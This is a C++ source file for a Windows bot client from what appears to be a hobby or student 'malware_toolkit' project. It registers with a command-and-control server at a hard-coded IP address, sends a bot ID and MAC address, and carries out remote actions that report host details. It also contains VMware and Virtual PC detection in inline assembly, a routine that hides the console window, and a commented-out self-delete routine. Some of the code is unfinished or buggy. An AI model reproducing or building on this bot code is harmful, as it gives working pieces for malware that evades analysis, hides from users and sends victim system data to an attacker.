#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <winuser.h>
#include <Iphlpapi.h>
#include <Assert.h>
#include <strsafe.h>
#include <vector>
#include "UtilLib.h"
#include "HttpLib.h"
#include "ActionController.h"
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable : 4996)


#define getSize(a) sizeof(a)/sizeof(a[0])

typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);

bool IsInsideVMWare();
bool IsInsideVPC();
void Stealth();
char* getMAC();
char* GetOS();
bool selfDelete();
char* GetProcessor();
char* GetIP();
void handleAction(struct Action);

using namespace std;

//vector<string> keys = { "bot_id", "username", "cpu", "antivirus", "registry", "data", "mac_address" };
//vector<string> values = { "1234567890234560", "mark", "lol", "antivirus", "registry", "testytest", "33-33-33-33-33-33" };
string BOT_ID = "";
string MAC_ADDR = "";
ActionController ac;
vector<string> values = vector<string>();
vector<string> keys = vector<string>();

int main(int argc, char *argv[])
{
	// these are now defined in Httplib
	/*string url = "70.61.16.8";
 	int port = 50000;*/
	string api = "/malware_toolkit/api/test/";

	vector<vector<string>> requestQueue;
	char* query = NULL;
	vector<string> params;

	// in the real program these will be fetched with functions
	BOT_ID = "3";
	MAC_ADDR = "00:00:00:00:00:00";


	//
	//char* MAC_ADDR = getMAC();
	keys.push_back("bot_id");
	values.push_back(BOT_ID);
	keys.push_back("mac_address");
	values.push_back(MAC_ADDR);

	string response = sendG_Request(url, port, "/database/api/connect_in/", requestQueue, keys, values, { "mac_address", "bot_id" });
	cout << response << endl;
	struct Action action = ac.parseAction(response);
	ac.addAction(action);
	int reqCounter = 1;
	while (action.action != "" && reqCounter > 0) {
		handleAction(action);
		reqCounter--;
	}
	
	printf("keys len: %d\n", keys.size());
	printf("values len: %d\n", values.size());
	sendP_Request(url, port, "/database/api/handler/", requestQueue, keys, values);
	dumpData(keys, values);

	system("pause");
	return 0;
}

void handleAction(struct Action) {
	struct Action action = ac.getNextAction();
	printf("action %s\n", action.action.c_str());
	while (action.action != "") {
		if (action.action == "Send OS") {
			printf("doing action %s\n", action.action.c_str());
			char *os = GetOS();
			keys.push_back("os");
			values.push_back(os);
		}
		if (action.action == "Send CPU") {
			printf("doing action %s\n", action.action.c_str());
			char *os = GetOS();
			keys.push_back("os");
			values.push_back(os);
		}
		action = ac.getNextAction();
	}
}

bool IsInsideVMWare()
{
	bool rc = true;
	char vm[] = "VMXh";
	char port[] = "VX";

	__try{
		__asm{
			push edx
				push ecx
				push ecx
				push ebx
				push ebx
				mov eax, 'VMXh'
				mov ebx, 0  //any value but not the MAGIC VALUE
				mov ecx, 10 // get VMWare versiond
				mov edx, 'VX'
				in eax, dx  //read port
				cmp ebx, 'VMXh' // is it a replay from VMWare
				setz rc
				pop ebx
				pop ecx
				pop edx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		rc = false;
	}

	return rc;
}

bool IsInsideVPC()
{
	bool rc = false;
	char vm[] = "VMXh";
	char port[] = "VX";

	__try{
		__asm{
			push ebx
				mov ebx, 0
				mov eax, 1
				__emit 0Fh
				__emit 3Fh
				__emit 07h
				__emit 0Bh
				test ebx, ebx
				setz[rc]
				pop ebx
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
	}

	return rc;
}

void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}

char* getMAC(){
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(AdapterInfo);
	char *mac_addr = (char*)malloc(17);

	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		do {
			sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1],
				pAdapterInfo->Address[2], pAdapterInfo->Address[3],
				pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
			return mac_addr;
			pAdapterInfo = pAdapterInfo->Next;
		} while (pAdapterInfo);
	}
	free(AdapterInfo);
}
//self delete wont build
/*bool selfDelete()
{
TCHAR szFile[1024], szCmd[1024];

if ((GetModuleFileName(0, szFile, MAX_PATH) != 0) &&
(GetShortPathName(szFile, szFile, MAX_PATH) != 0))
{
lstrcpy(szCmd, "/c del ");
lstrcat(szCmd, szFile);
lstrcat(szCmd, " >> NUL");

if ((GetEnvironmentVariable("ComSpec", szFile, MAX_PATH) != 0) &&
((int)ShellExecute(0, 0, szFile, szCmd, 0, SW_HIDE)>32))
return TRUE;
}

return FALSE;
}
*/

char* GetOS()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

	if (!bOsVersionInfoEx){
#ifdef __APPLE__
		return "Mac";
#elif __linux__
		return "Linux";
#elif __unix__
		return "Unix";
#endif
		return "Other";
	}

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion == 6){
			if (osvi.dwMinorVersion == 0){
				if (osvi.wProductType == VER_NT_WORKSTATION)
					return "Windows Vista";
				else return "Windows Server 2008";
			}
			if (osvi.dwMinorVersion == 1 || osvi.dwMinorVersion == 2){
				if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 1)
					return "Windows 7";
				else
					if (osvi.wProductType == VER_NT_WORKSTATION && osvi.dwMinorVersion == 2)
						return "Windows 8";
					else return "Windows Server 2008 R2";
			}
		}
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2){
			if (osvi.wSuiteMask & VER_SUITE_WH_SERVER)
				return "Windows Home Server";
			else if (osvi.wProductType == VER_NT_WORKSTATION && si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "Windows XP Professional";
			else return "Windows Server 2003";
		}

		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1)
			return "Windows XP";
		if (osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0)
			return "Windows 2000";
		return "Windows";
	}
	else
		return "Other";
}

char* GetProcessor()
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*)&osvi);

	if (!bOsVersionInfoEx) return "Not Determined";

	pGNSI = (PGNSI)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "GetNativeSystemInfo");
	if (NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);

	if (VER_PLATFORM_WIN32_NT == osvi.dwPlatformId && osvi.dwMajorVersion > 4){
		if (osvi.dwMajorVersion >= 6){
			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				return "64-bit";
			else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
				return "32-bit";
		}
		else
			return "32-bit";
	}
	return "Not Determined";
}

char* GetIP()
{
	WSAData wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	HOSTENT* Host;
	char hostname[128] = { 0 };
	char* IPv4 = new char[128];
	gethostname(hostname, 128);
	Host = gethostbyname(hostname);
	IPv4 = inet_ntoa(*(in_addr*)Host->h_addr_list[0]);
	WSACleanup();
	return IPv4;

}
